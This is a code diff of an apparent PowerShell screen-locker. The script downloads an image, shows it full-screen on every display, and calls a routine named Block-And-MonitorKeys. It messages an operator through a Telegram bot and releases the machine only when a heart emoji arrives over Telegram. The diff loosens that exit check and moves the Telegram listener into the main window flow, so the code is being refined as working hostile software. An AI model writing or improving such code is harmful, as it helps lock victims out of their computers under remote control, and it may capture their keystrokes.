@@ -43,7 +43,8 @@ function Start-Telegram-Listener {
             foreach ($update in $response.result) {
                 if ($update.update_id -gt $lastUpdateId) {
                     $lastUpdateId = $update.update_id
-                    if ($update.message.text -eq '❤️') {
+                    $txt = $update.message.text
+                    if ($txt -eq "❤️" -or $txt -like "*❤*") {
                         [Environment]::Exit(0)
                     }
                 }
@@ -137,11 +138,12 @@ function Show-FullScreenImage {
     }
 
     foreach ($form in $forms) { [void]$form.Show() }
+    [System.Windows.Forms.Application]::DoEvents()
+    Start-Telegram-Listener
     [System.Windows.Forms.Application]::Run()
 }
 
 Download-Image
 Send-Telegram-Message
-Start-Job -ScriptBlock { Start-Telegram-Listener }
 Block-And-MonitorKeys
 Show-FullScreenImage
